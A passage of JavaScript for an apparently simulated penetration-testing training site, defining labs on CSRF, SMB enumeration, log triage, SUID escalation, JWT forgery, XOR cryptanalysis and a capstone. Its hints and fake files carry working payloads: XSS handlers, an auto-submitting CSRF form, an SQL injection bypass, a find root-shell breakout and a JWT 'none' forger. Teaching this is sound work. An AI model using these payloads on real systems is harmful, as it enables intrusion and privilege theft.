            const hasHandler = lower.includes('onfocus') || lower.includes('autofocus') || lower.includes('onload') || lower.includes('onerror');
            const hasExecution = cmd.includes('alert') || cmd.includes('flag') || cmd.includes('document.domain');
            return ast.executable === 'curl' && hasHandler && hasExecution;
          },
          syntaxHint: "Trigger XSS: curl \"http://portal.local/search?q=test\\\"+autofocus+onfocus=\\\"alert(document.domain)\\\"+x=\\\"\"",
          successNote: "Event handler injected! Execution confirmed without requiring <script> tags. Flag: flag{context_aware_output_encoding_csp}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 07: Cross-Site Request Forgery (CSRF) & SameSite
    // -----------------------------------------------------------------------
    'lab-csrf': {
      id: 'lab-csrf',
      num: '07',
      title: 'Cross-Site Request Forgery (CSRF) & SameSite',
      targetHost: 'bank.local',
      targetPort: '80 (HTTP)',
      targetUrl: 'http://bank.local/transfer',
      initialUser: 'tester',
      initialDir: '/home/tester',
      allowedTools: ['curl', 'cat', 'ls', 'whoami', 'pwd', 'grep', 'clear', 'help'],
      initialFiles: {
        '/home/tester/exploit.html': {
          type: 'file',
          mode: 0o644,
          owner: 'tester',
          group: 'tester',
          content: `<form action="http://bank.local/transfer" method="POST" id="csrfForm">
  <input type="hidden" name="to_account" value="ATTACKER" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.getElementById('csrfForm').submit();</script>`
        },
        '/var/www/attacker/exploit.html': {
          type: 'file',
          mode: 0o644,
          owner: 'tester',
          group: 'tester',
          content: `<!-- Auto-submitting cross-origin transfer form -->
<form action="http://bank.local/transfer" method="POST" id="csrfForm">
  <input type="hidden" name="to_account" value="12345" />
  <input type="hidden" name="amount" value="100" />
</form>
<script>document.getElementById('csrfForm').submit();</script>`
        },
        '/var/www/bank/csrf_token.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'root',
          group: 'root',
          content: 'CSRF Defense Token & Flag: flag{samesite_strict_anti_csrf_token}'
        }
      },
      tasks: [
        {
          id: 'analyze-endpoint',
          title: 'Analyze the State-Changing Fund Transfer Endpoint',
          validate: (cmd, ast) => {
            return ast.executable === 'curl' && cmd.includes('/transfer') && (cmd.includes('to_account') || cmd.includes('amount') || ast.options.X === 'POST');
          },
          syntaxHint: "Probe transfer endpoint: curl -X POST -d \"to_account=12345&amount=100\" http://bank.local/transfer",
          successNote: "Transfer endpoint parameters analyzed: accepts state-changing POST requests."
        },
        {
          id: 'inspect-samesite',
          title: 'Inspect Session Cookie for Missing SameSite Attribute',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            const isHead = ast.flags.has('I') || ast.flags.has('head') || cmd.includes('-I');
            return ast.executable === 'curl' && (isHead || lower.includes('cookie'));
          },
          syntaxHint: "Check session cookie: 'curl -I http://bank.local/login | grep -i cookie'",
          successNote: "Session cookie lacks SameSite=Strict or SameSite=Lax flags, permitting cross-site inclusion."
        },
        {
          id: 'review-poc-form',
          title: 'Review Attacker Proof-of-Concept Exploit Form',
          validate: (cmd, ast) => {
            return ast.executable === 'cat' && cmd.includes('exploit.html');
          },
          syntaxHint: "Review PoC form: 'cat /var/www/attacker/exploit.html' or 'cat exploit.html'.",
          successNote: "PoC auto-submitting form reviewed."
        },
        {
          id: 'submit-csrf-flag',
          title: 'Submit Anti-CSRF Token Defense Flag',
          validate: (cmd, ast, out, session) => {
            return (ast.executable === 'cat' && cmd.includes('csrf_token.txt')) || cmd.includes('flag{samesite_strict_anti_csrf_token}');
          },
          syntaxHint: "Read token defense flag: 'cat /var/www/bank/csrf_token.txt'.",
          successNote: "CSRF remediation flag verified: flag{samesite_strict_anti_csrf_token}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 08: Network Service & SMB Enumeration
    // -----------------------------------------------------------------------
    'lab-network': {
      id: 'lab-network',
      num: '08',
      title: 'Network Service & SMB Enumeration',
      targetHost: '10.10.20.15',
      targetPort: '21, 22, 80, 445',
      initialUser: 'auditor',
      initialDir: '/home/auditor',
      allowedTools: ['nmap', 'nc', 'netcat', 'smbclient', 'cat', 'ls', 'whoami', 'id', 'pwd', 'clear', 'help'],
      initialFiles: {
        '/home/auditor/scope.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'auditor',
          group: 'auditor',
          content: 'Scope Authorization: 10.10.20.15 (and 10.10.110.45)\nObjectives: SYN stealth scan, service version detection, SMB share listing.'
        }
      },
      tasks: [
        {
          id: 'stealth-syn-scan',
          title: 'Perform Stealth SYN Scan with Service Probing',
          validate: (cmd, ast) => {
            if (ast.executable !== 'nmap') return false;
            const hasVersion = ast.flags.has('sV') || ast.flags.has('A') || cmd.includes('-sV');
            const hasTarget = cmd.includes('10.10.20.15') || cmd.includes('10.10.110.45') || cmd.includes('10.10.110.100');
            return hasVersion && hasTarget;
          },
          syntaxHint: "Run version scan: nmap -sS -sV 10.10.20.15",
          successNote: "Open ports and service versions enumerated across target host."
        },
        {
          id: 'identify-ftp-daemon',
          title: 'Identify the Vulnerable FTP Daemon',
          validate: (cmd, ast) => {
            if (ast.executable !== 'nmap') return false;
            const hasPort21 = cmd.includes('-p 21') || cmd.includes('-p21') || cmd.includes('21,');
            const hasTarget = cmd.includes('10.10.20.15') || cmd.includes('10.10.110.45') || cmd.includes('10.10.110.100');
            return hasPort21 && hasTarget;
          },
          syntaxHint: "Probe FTP service specifically: nmap -sV -p 21 10.10.20.15",
          successNote: "Vulnerable daemon identified: vsftpd 2.3.4 (CVE-2011-2523 backdoor)."
        },
        {
          id: 'banner-grab-netcat',
          title: 'Perform Raw Banner Grabbing via Netcat',
          validate: (cmd, ast) => {
            const isNc = ast.executable === 'nc' || ast.executable === 'netcat';
            const hasPort21 = cmd.includes('21');
            const hasTarget = cmd.includes('10.10.20.15') || cmd.includes('10.10.110.45') || cmd.includes('10.10.110.100');
            return isNc && hasPort21 && hasTarget;
          },
          syntaxHint: "Grab banner with Netcat: nc -vn 10.10.20.15 21",
          successNote: "Raw socket connection confirmed: 220 (vsFTPd 2.3.4) banner verified."
        },
        {
          id: 'enumerate-smb-shares',
          title: 'Enumerate Anonymous SMB File Shares',
          validate: (cmd, ast) => {
            if (ast.executable !== 'smbclient') return false;
            const hasList = ast.flags.has('L') || ast.flags.has('l') || cmd.includes('-L') || cmd.includes('-l');
            const hasTarget = cmd.includes('10.10.20.15') || cmd.includes('10.10.110.45') || cmd.includes('10.10.110.100');
            return hasList && hasTarget;
          },
          syntaxHint: "Enumerate shares: smbclient -L //10.10.20.15 -N",
          successNote: "Anonymous SMB shares mapped: 'public' and 'backups' accessible without authentication."
        },
        {
          id: 'retrieve-network-flag',
          title: 'Retrieve Network Enumeration Flag',
          validate: (cmd, ast, out, session) => {
            const isSmbGet = ast.executable === 'smbclient' && (cmd.includes('get flag.txt') || cmd.includes('flag.txt'));
            const isCatFlag = ast.executable === 'cat' && cmd.includes('flag.txt');
            return isSmbGet || isCatFlag || cmd.includes('flag{closed_filtered_port_21_backdoor}');
          },
          syntaxHint: "Download flag: smbclient //10.10.20.15/public -N -c \"get flag.txt; exit\"",
          successNote: "Network enumeration flag retrieved: flag{closed_filtered_port_21_backdoor}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 09: Security Incident Log Analysis
    // -----------------------------------------------------------------------
    'lab-logs': {
      id: 'lab-logs',
      num: '09',
      title: 'Security Incident Log Analysis',
      targetHost: 'triage-station.local',
      targetPort: 'Local Filesystem (/var/log)',
      initialUser: 'soc-analyst',
      initialDir: '/var/log/apache2',
      allowedTools: ['cat', 'grep', 'head', 'tail', 'ls', 'whoami', 'id', 'pwd', 'clear', 'help'],
      initialFiles: {
        '/var/log/apache2/access.log': {
          type: 'file',
          mode: 0o644,
          owner: 'root',
          group: 'adm',
          content: `192.168.1.100 - - [04/Oct/2026:08:00:15] "GET /index.php HTTP/1.1" 200 4520
192.168.1.50 - - [04/Oct/2026:10:15:23] "GET /index.php HTTP/1.1" 200 4520
192.168.1.50 - - [04/Oct/2026:10:15:25] "GET /admin HTTP/1.1" 404 280
192.168.1.50 - - [04/Oct/2026:10:16:01] "GET /view.php?file=../../../../etc/passwd HTTP/1.1" 200 1820
192.168.1.50 - - [04/Oct/2026:10:18:12] "POST /upload.php HTTP/1.1" 200 320
192.168.1.50 - - [04/Oct/2026:10:18:45] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 45`
        },
        '/var/log/auth.log': {
          type: 'file',
          mode: 0o644,
          owner: 'root',
          group: 'adm',
          content: `Oct 04 08:10:01 sec-station sshd[2410]: Failed password for invalid user admin from 192.168.1.50 port 44102 ssh2
Oct 04 08:10:03 sec-station sshd[2412]: Failed password for root from 192.168.1.50 port 44104 ssh2
Oct 04 08:10:05 sec-station sshd[2415]: Failed password for invalid user oracle from 192.168.1.50 port 44106 ssh2
Oct 04 08:10:08 sec-station sshd[2420]: Failed password for root from 192.168.1.50 port 44108 ssh2`
        },
        '/var/log/apache2/auth.log': {
          type: 'file',
          mode: 0o644,
          owner: 'root',
          group: 'adm',
          content: `Oct 04 08:10:01 sec-station sshd[2410]: Failed password for invalid user admin from 192.168.1.50 port 44102 ssh2
Oct 04 08:10:03 sec-station sshd[2412]: Failed password for root from 192.168.1.50 port 44104 ssh2
Oct 04 08:10:05 sec-station sshd[2415]: Failed password for invalid user oracle from 192.168.1.50 port 44106 ssh2
Oct 04 08:10:08 sec-station sshd[2420]: Failed password for root from 192.168.1.50 port 44108 ssh2`
        },
        '/var/log/apache2/incident_summary.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'soc-analyst',
          group: 'soc-analyst',
          content: `Incident Report: Multi-Stage Intrusion Campaign
Attacker IP: 192.168.1.50
Attack Sequence:
1. Path traversal (/etc/passwd)
2. Web shell upload (/uploads/shell.php)
3. Automated SSH password brute force
Triage Flag: flag{failed_ssh_brute_force_192_168_1_50}`
        }
      },
      tasks: [
        {
          id: 'inspect-access-logs',
          title: 'Inspect Web Server Access Logs',
          validate: (cmd, ast) => {
            return (ast.executable === 'cat' || ast.executable === 'head') && cmd.includes('access.log');
          },
          syntaxHint: "Inspect access log: 'cat access.log | head -n 20' or 'head access.log'.",
          successNote: "Web access logs loaded and parsed."
        },
        {
          id: 'filter-traversal',
          title: 'Filter for Path Traversal Attack Signatures',
          validate: (cmd, ast) => {
            const hasPattern = cmd.includes('..') || cmd.includes('\\.') || cmd.includes('passwd') || (ast.positionals[0] && ast.positionals[0].includes('.'));
            return ast.executable === 'grep' && hasPattern;
          },
          syntaxHint: "Search traversal patterns: 'grep -E \"\\.\\./\" access.log' or 'grep passwd access.log'.",
          successNote: "Isolated path traversal attack originating from 192.168.1.50."
        },
        {
          id: 'identify-webshell',
          title: 'Identify the Uploaded Malicious Web Shell',
          validate: (cmd, ast) => {
            return ast.executable === 'grep' && (cmd.includes('shell.php') || cmd.includes('uploads') || cmd.includes('upload'));
          },
          syntaxHint: "Search uploads: 'grep uploads access.log'.",
          successNote: "Identified web shell execution: GET /uploads/shell.php?cmd=whoami."
        },
        {
          id: 'trace-ssh-bruteforce',
          title: 'Trace SSH Brute Force Origin IP in auth.log',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            return cmd.includes('auth.log') && (lower.includes('failed') || lower.includes('password') || ast.executable === 'grep' || ast.executable === 'cat');
          },
          syntaxHint: "Search failed SSH attempts: 'grep \"Failed password\" auth.log'.",
          successNote: "Attacker IP 192.168.1.50 isolated: repeated failed authentication against root and administrative accounts."
        },
        {
          id: 'submit-incident-flag',
          title: 'Submit Incident Response Flag & Draft Detection Rule',
          validate: (cmd, ast, out, session) => {
            return (ast.executable === 'cat' && cmd.includes('incident_summary.txt')) || cmd.includes('flag{failed_ssh_brute_force_192_168_1_50}');
          },
          syntaxHint: "Read incident summary: 'cat incident_summary.txt'.",
          successNote: "Incident triage flag confirmed: flag{failed_ssh_brute_force_192_168_1_50}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 10: SUID Privilege Escalation
    // -----------------------------------------------------------------------
    'lab-suid': {
      id: 'lab-suid',
      num: '10',
      title: 'SUID Privilege Escalation',
      targetHost: 'ubuntu-srv-02.local',
      targetPort: 'Local Shell (guest)',
      initialUser: 'guest',
      initialDir: '/home/guest',
      allowedTools: ['whoami', 'id', 'find', 'cat', 'ls', 'stat', 'pwd', 'file', 'which', 'echo', 'clear', 'help'],
      initialFiles: {
        '/usr/bin/find': {
          type: 'file',
          mode: 0o4755, // Dangerous SUID bit set on find!
          owner: 'root',
          group: 'root',
          content: 'ELF 64-bit LSB executable, x86-64, dynamically linked (GNU findutils)'
        },
        '/usr/bin/passwd': {
          type: 'file',
          mode: 0o4755,
          owner: 'root',
          group: 'root',
          content: 'ELF 64-bit LSB executable (passwd utility)'
        },
        '/usr/bin/sudo': {
          type: 'file',
          mode: 0o4755,
          owner: 'root',
          group: 'root',
          content: 'ELF 64-bit LSB executable (sudo binary)'
        },
        '/root/flag.txt': {
          type: 'file',
          mode: 0o600, // Only accessible by root
          owner: 'root',
          group: 'root',
          content: 'flag{suid_find_root_euid0}'
        },
        '/home/guest/notes.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'guest',
          group: 'guest',
          content: 'Host privilege audit: discover SUID binaries with find / -perm -4000 2>/dev/null.'
        }
      },
      tasks: [
        {
          id: 'check-user-boundary',
          title: 'Check Current User and Privilege Boundaries',
          validate: (cmd, ast) => ast.executable === 'id' || ast.executable === 'whoami',
          syntaxHint: "Inspect user ID: 'id' or 'whoami'.",
          successNote: "Current user confirmed as unprivileged guest (UID=1001, GID=1001)."
        },
        {
          id: 'search-suid-binaries',
          title: 'Search Filesystem for SUID Binaries',
          validate: (cmd, ast) => {
            return ast.executable === 'find' && (cmd.includes('-4000') || cmd.includes('/4000') || cmd.includes('u=s'));
          },
          syntaxHint: "Search SUID: find / -perm -4000 -type f 2>/dev/null",
          successNote: "SUID binaries enumerated across the filesystem."
        },
        {
          id: 'identify-find-binary',
          title: 'Identify the Misconfigured SUID Binary',
          validate: (cmd, ast) => {
            const checksFind = cmd.includes('/usr/bin/find') || (cmd.includes('find') && (ast.executable === 'ls' || ast.executable === 'stat' || ast.executable === 'file' || ast.executable === 'which'));
            return checksFind;
          },
          syntaxHint: "Audit find binary: 'ls -l /usr/bin/find' or 'stat /usr/bin/find'.",
          successNote: "Isolated /usr/bin/find: unusual SUID binary capable of shell breakout."
        },
        {
          id: 'gtfobins-breakout',
          title: 'Execute GTFOBins Breakout to Spawn Root Shell',
          validate: (cmd, ast, out, session) => session.isElevatedRoot === true,
          syntaxHint: "Execute breakout: find . -exec /bin/sh -p \\; -quit",
          successNote: "EUID=0 established! Root shell spawned."
        },
        {
          id: 'read-root-flag',
          title: 'Read Root Flag and Audit Remediation',
          validate: (cmd, ast, out, session) => {
            return session.isElevatedRoot && ast.executable === 'cat' && cmd.includes('flag.txt');
          },
          syntaxHint: "As root, run 'cat /root/flag.txt'.",
          successNote: "Root flag recovered: flag{suid_find_root_euid0}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 11: JWT 'None' Algorithm Exploitation
    // -----------------------------------------------------------------------
    'lab-jwt': {
      id: 'lab-jwt',
      num: '11',
      title: "JWT 'None' Algorithm Exploitation",
      targetHost: 'auth.cloud-jwt.local',
      targetPort: '443 (HTTPS)',
      targetUrl: 'https://auth.cloud-jwt.local',
      initialUser: 'operator',
      initialDir: '/home/operator',
      allowedTools: ['cat', 'python3', 'python', 'base64', 'curl', 'echo', 'ls', 'whoami', 'pwd', 'clear', 'help'],
      initialFiles: {
        '/home/operator/token.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'operator',
          group: 'operator',
          content: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzAwMDAwMDAwfQ.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk'
        },
        '/home/operator/forge_jwt.py': {
          type: 'file',
          mode: 0o755,
          owner: 'operator',
          group: 'operator',
          content: `# JWT None Algorithm Exploit PoC
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "superadmin", "iat": 1700000000}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

forged = f"{b64url(header)}.{b64url(payload)}."
print("[+] Forged Unsigned JWT Token:")
print(forged)
print("[+] Submit with Authorization: Bearer <token>")`
        }
      },
      tasks: [
        {
          id: 'inspect-jwt-token',
          title: 'Inspect and Decode the User JWT Token',
          validate: (cmd, ast) => ast.executable === 'cat' && cmd.includes('token.txt'),
          syntaxHint: "Inspect token: cat token.txt",
          successNote: "Raw 3-part period-separated token inspected."
        },
        {
          id: 'decode-jwt-payload',
          title: 'Decode Header and Payload JSON',
          validate: (cmd, ast) => {
            const isBase64 = cmd.toLowerCase().includes('base64');
            const hasDecode = cmd.includes('-d') || cmd.includes('--decode') || cmd.includes('-D');
            return isBase64 && hasDecode;
          },
          syntaxHint: "Decode payload: echo \"eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzAwMDAwMDAwfQ\" | base64 -d",
          successNote: "Token decoded: subject 'guest', role 'user'."
        },
        {
          id: 'forge-header-none',
          title: "Forge Token Header with 'none' Algorithm",
          validate: (cmd, ast) => {
            const hasNone = cmd.includes('none') && cmd.includes('alg');
            const hasEncode = cmd.includes('base64') || cmd.includes('python');
            return hasNone && hasEncode;
          },
          syntaxHint: "Encode header: echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64",
          successNote: "Forged header with alg:none generated."
        },
        {
          id: 'elevate-superadmin-role',
          title: "Elevate Role to 'superadmin' and Strip Signature",
          validate: (cmd, ast) => {
            const isPythonScript = (ast.executable === 'python3' || ast.executable === 'python') && cmd.includes('forge_jwt.py');
            const isEchoToken = cmd.includes('superadmin') && (cmd.includes('none') || cmd.includes('eyJhbGciOiJub25l'));
            return isPythonScript || isEchoToken;
          },
          syntaxHint: "Assemble token: python3 forge_jwt.py or echo token ending with trailing dot.",
          successNote: "Forged token constructed: role set to superadmin, signature stripped."
        },
        {
          id: 'transmit-forged-token',
          title: 'Transmit Forged Token and Retrieve Flag',
          validate: (cmd, ast) => {
            const isCurl = ast.executable === 'curl';
            const hasBearer = cmd.includes('Bearer') || cmd.includes('Authorization');
            const hasNoneToken = cmd.includes('eyJhbGciOiJub25l') || cmd.includes('admin');
            return isCurl && hasBearer && hasNoneToken;
          },
          syntaxHint: "Transmit token: curl -H \"Authorization: Bearer <forged_token>\" http://auth.api.local/admin",
          successNote: "Server accepted unsigned token! Flag: flag{none_algorithm_signature_verification}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 12: XOR & Frequency Analysis Decryption
    // -----------------------------------------------------------------------
    'lab-crypto': {
      id: 'lab-crypto',
      num: '12',
      title: 'XOR & Frequency Analysis Decryption',
      targetHost: 'crypto-box.local',
      targetPort: 'Local CLI',
      initialUser: 'cryptanalyst',
      initialDir: '/home/cryptanalyst',
      allowedTools: ['cat', 'python3', 'python', 'ls', 'whoami', 'pwd', 'grep', 'clear', 'help'],
      initialFiles: {
        '/home/cryptanalyst/ciphertext.hex': {
          type: 'file',
          mode: 0o644,
          owner: 'cryptanalyst',
          group: 'cryptanalyst',
          content: '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'
        },
        '/home/cryptanalyst/solve.py': {
          type: 'file',
          mode: 0o755,
          owner: 'cryptanalyst',
          group: 'cryptanalyst',
          content: `# Single-Byte XOR Frequency Analysis Solver
hex_data = "1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736"
raw = bytes.fromhex(hex_data)

ETAOIN = "ETAOINSHRDLU "
best_score = 0
best_key = None
best_plain = ""

for key in range(256):
    dec = bytes([b ^ key for b in raw])
    score = sum(1 for b in dec if chr(b).upper() in ETAOIN)
    if score > best_score:
        best_score = score
        best_key = key
        try:
            best_plain = dec.decode('ascii')
        except:
            pass

print(f"[+] Optimal Key: 0x{best_key:02x} ('{chr(best_key)}')")
print(f"[+] Decrypted: \\"{best_plain}\\"")
print("[+] Defensive Flag: flag{aes_gcm_authenticated_encryption}")`
        },
        '/home/cryptanalyst/decrypted.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'cryptanalyst',
          group: 'cryptanalyst',
          content: `Key: 0x58 ('X')
Decrypted Plaintext: "Cooking MC's like a pound of bacon"
Remediation Flag: flag{aes_gcm_authenticated_encryption}`
        }
      },
      tasks: [
        {
          id: 'inspect-hex-ciphertext',
          title: 'Inspect the Hex-Encoded Ciphertext',
          validate: (cmd, ast) => ast.executable === 'cat' && cmd.includes('ciphertext.hex'),
          syntaxHint: "Read ciphertext: cat ciphertext.hex",
          successNote: "Hex-encoded ciphertext loaded (34 bytes)."
        },
        {
          id: 'calculate-keyspace',
          title: 'Understand the Single-Byte XOR Keyspace',
          validate: (cmd, ast) => {
            return cmd.includes('2**8') || cmd.includes('256') || cmd.includes('range(256)');
          },
          syntaxHint: "Calculate keyspace: python3 -c \"print(2**8)\"",
          successNote: "8-bit keyspace calculated: exactly 256 possible single-byte keys."
        },
        {
          id: 'letter-frequency-scoring',
          title: 'Perform English Letter Frequency Scoring',
          validate: (cmd, ast) => {
            return cmd.includes('ETAOIN') || (cmd.includes('grep') && cmd.includes('solve.py'));
          },
          syntaxHint: "Review frequency distribution: python3 -c \"print('ETAOIN SHRDLU')\"",
          successNote: "ETAOIN SHRDLU English character frequency baseline established."
        },
        {
          id: 'recover-secret-key',
          title: 'Recover Secret Key and Decrypt Plaintext',
          validate: (cmd, ast) => {
            const isSolve = (ast.executable === 'python3' || ast.executable === 'python') && cmd.includes('solve.py');
            const isChrKey = cmd.includes('0x58') || cmd.includes('chr(88)') || cmd.includes('chr(0x58)');
            return isSolve || isChrKey;
          },
          syntaxHint: "Execute solver: python3 solve.py or python3 -c \"print(chr(0x58))\"",
          successNote: "Key 0x58 ('X') identified! Plaintext decrypted: \"Cooking MC's like a pound of bacon\"."
        },
        {
          id: 'submit-crypto-flag',
          title: 'Submit Cryptography Flag and Review AES-GCM',
          validate: (cmd, ast, out, session) => {
            const isCatDecrypted = ast.executable === 'cat' && cmd.includes('decrypted.txt');
            return isCatDecrypted || cmd.includes('flag{aes_gcm_authenticated_encryption}');
          },
          syntaxHint: "Submit flag token: flag{aes_gcm_authenticated_encryption}",
          successNote: "Defensive cryptography flag verified: flag{aes_gcm_authenticated_encryption}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 13: Capstone Pentest: Final Enterprise Target
    // -----------------------------------------------------------------------
    'lab-capstone': {
      id: 'lab-capstone',
      num: '13',
      title: 'Capstone Pentest: Final Enterprise Target',
      targetHost: '10.10.10.100',
      targetPort: '22 (SSH) / 80 (HTTP)',
      initialUser: 'cadet',
      initialDir: '/home/cadet',
      allowedTools: ['nmap', 'curl', 'cat', 'ls', 'whoami', 'id', 'pwd', 'find', 'grep', 'clear', 'help'],
      initialFiles: {
        '/home/cadet/notes.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'cadet',
          group: 'cadet',
          content: `Capstone Engagement Rules of Engagement:
Target: 10.10.10.100
Scope: Authorized enterprise security penetration test.
Phase 1: Reconnaissance (Nmap port scan)
Phase 2: Web API discovery & fuzzing
Phase 3: SQL injection exploitation
Phase 4: SSH initial foothold access
Phase 5: SUID binary enumeration & privilege escalation
Phase 6: Executive reporting & final flag retrieval`
        },
        '/home/cadet/user.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'cadet',
          group: 'cadet',
          content: 'flag{cadet_initial_foothold_access_2026}'
        },
        '/root/root.txt': {
          type: 'file',
          mode: 0o600,
          owner: 'root',
          group: 'root',
          content: 'flag{endlessus_capstone_certified_junior_pentester_2026}\n[+] Certification Confirmed: Endlessus Certified Junior Penetration Tester.'
        },
        '/root/report.txt': {
          type: 'file',
          mode: 0o600,
          owner: 'root',
          group: 'root',
          content: `Executive Remediation Report:
1. Critical: Input concatenation on /api/v2/auth permitted SQL injection.
   Remediation: Implement parameterized prepared statements.
2. High: SUID bit enabled on /usr/bin/find permitted privilege escalation to root.
   Remediation: chmod u-s /usr/bin/find.
3. Verification Flag: flag{endlessus_capstone_certified_junior_pentester_2026}`
        }
      },
      tasks: [
        {
          id: 'recon-nmap',
          title: 'Phase 1: Recon & Nmap Scan',
          validate: (cmd, ast) => {
            return ast.executable === 'nmap' && (cmd.includes('10.10.10.100') || cmd.includes('22') || cmd.includes('80'));
          },
          syntaxHint: "Scan target: 'nmap -sV -p 22,80 10.10.10.100'",
          successNote: "Open ports discovered: 22/tcp (SSH OpenSSH 8.9), 80/tcp (HTTP Node.js Express)."
        },
        {
          id: 'directory-fuzzing',
          title: 'Phase 2: Directory Fuzzing & API Discovery',
          validate: (cmd, ast) => {
            return ast.executable === 'curl' && cmd.includes('/api/v2/auth');
          },
          syntaxHint: "Query API: 'curl http://10.10.10.100/api/v2/auth'",
          successNote: "Hidden administrative login gateway located at /api/v2/auth."
        },
        {
          id: 'sqli-exploitation',
          title: 'Phase 3: SQLi Exploitation & Auth Bypass',
          validate: (cmd, ast) => {
            if (ast.executable !== 'curl') return false;
            const payload = String(ast.options.d || ast.options.data || cmd);
            const hasSqli = (payload.includes("admin'") || payload.includes("admin\\'") || payload.includes("admin%27")) &&
                            (payload.includes('--') || payload.includes('#') || payload.toLowerCase().includes('or'));
            return cmd.includes('/api/v2/auth') && hasSqli;
          },
          syntaxHint: "Exploit SQLi: curl -X POST -d \"user=admin'--&pass=x\" http://10.10.10.100/api/v2/auth",
          successNote: "Authentication bypassed! Admin session token and SSH credential hint retrieved."
        },
        {
          id: 'user-foothold',
          title: 'Phase 4: SSH Initial Foothold & User Flag',
          validate: (cmd, ast) => {
            return (ast.executable === 'cat' && cmd.includes('user.txt')) || cmd.includes('ssh cadet@10.10.10.100');
          },
          syntaxHint: "Inspect user flag: 'cat user.txt' or 'cat /home/cadet/user.txt'",
          successNote: "Initial access verified! User flag retrieved: flag{cadet_initial_foothold_access_2026}."
        },
        {
          id: 'suid-privesc',
          title: 'Phase 5: SUID Privilege Escalation',
          validate: (cmd, ast, out, session) => {
            return Boolean(session.isElevatedRoot) && (cmd.includes('find') || cmd.includes('/bin/sh'));
          },
          syntaxHint: "Escalate privileges: 'find . -exec /bin/sh -p \\; -quit'",
          successNote: "Root shell spawned via SUID find breakout! Effective UID is now 0 (root)."
        },
        {
          id: 'root-flag',
          title: 'Phase 6: Executive Reporting & Root Flag',
          validate: (cmd, ast, out, session) => {
            const readsRoot = ast.executable === 'cat' && (cmd.includes('root.txt') || cmd.includes('report.txt'));
            return Boolean(session.isElevatedRoot) && (readsRoot || cmd.includes('flag{endlessus_capstone_certified_junior_pentester_2026}'));
          },
          syntaxHint: "Read root flag: 'cat /root/root.txt'",
          successNote: "Capstone complete! Final certification flag verified: flag{endlessus_capstone_certified_junior_pentester_2026}."
        }
      ]
    }
  };

  // Flag definitions per lab (Primary tokens & accepted aliases)
  const LAB_FLAGS = {
    'lab-headers': ['flag{strict_transport_security_csp}', 'nosniff', 'deny', 'hsts', 'csp', 'strict-transport-security'],
    'lab-permissions': ['flag{chmod_600_config_rw}', '600', 'rw-------', 'chmod 600', 'chmod 640'],
    'lab-auth': ['flag{rate_limit_429_bcrypt}', 'bcrypt', '429', 'rate limit', 'argon2'],
    'lab-idor': ['flag{server_side_authz_session_token}', '10043', '403', 'authz', 'idor'],
    'lab-sqli': ['flag{parameterized_queries_prepared_statement}', "admin' or '1'='1", "admin' or 1=1", 'prepared statement', 'parameterized'],
    'lab-xss': ['flag{context_aware_output_encoding_csp}', 'htmlspecialchars', 'innertext', 'textcontent', 'encoding'],
    'lab-csrf': ['flag{samesite_strict_anti_csrf_token}', 'samesite=strict', 'csrf_token', 'anti-csrf', 'samesite'],
    'lab-network': ['flag{closed_filtered_port_21_backdoor}', '21/tcp', 'vsftpd 2.3.4', 'vsftpd', '21'],
    'lab-logs': ['flag{failed_ssh_brute_force_192_168_1_50}', '192.168.1.50', 'failed password', 'ssh brute force', 'brute force'],
    'lab-suid': ['flag{suid_find_root_euid0}', 'find . -exec /bin/sh -p', '/bin/sh -p', 'find -exec', 'euid=0'],
    'lab-jwt': ['flag{none_algorithm_signature_verification}', 'none', 'alg: none', 'hs256', 'signature'],
    'lab-crypto': ['flag{aes_gcm_authenticated_encryption}', 'aes-256-gcm', 'aes-gcm', 'gcm', 'authenticated encryption'],
    'lab-capstone': ['flag{endlessus_capstone_certified_junior_pentester_2026}', 'capstone', 'junior pentester', 'certified junior pentester']
  };

  // =========================================================================
  // 4. SESSION & STATE PERSISTENCE MANAGER
  // =========================================================================
  const memoryStore = {};
  const LabStorage = {
    getItem: (key) => {
      try {
        if (typeof localStorage !== 'undefined') return localStorage.getItem(key);
      } catch (e) {}
      return memoryStore[key] || null;
    },
    setItem: (key, val) => {
      try {
        if (typeof localStorage !== 'undefined') {
          localStorage.setItem(key, val);
          return;
        }
      } catch (e) {}
      memoryStore[key] = val;
    },
    removeItem: (key) => {
      try {
        if (typeof localStorage !== 'undefined') {
          localStorage.removeItem(key);
          return;
        }
      } catch (e) {}
      delete memoryStore[key];
    }
  };

  class LabSessionManager {
    static getStorageKey(labId) {
      return `endlessus_lab_session_v3_${labId}`;
    }

    static loadSession(labId) {
      const spec = LAB_SPECIFICATIONS[labId];
      if (!spec) return null;

      try {
        const raw = LabStorage.getItem(this.getStorageKey(labId));
        if (raw) {
          const parsed = JSON.parse(raw);
          const fs = new LabVirtualFS(parsed.fsTree || spec.initialFiles);
          return {
            labId,
            user: parsed.user || spec.initialUser,
            euid: typeof parsed.euid === 'number' ? parsed.euid : 1001,
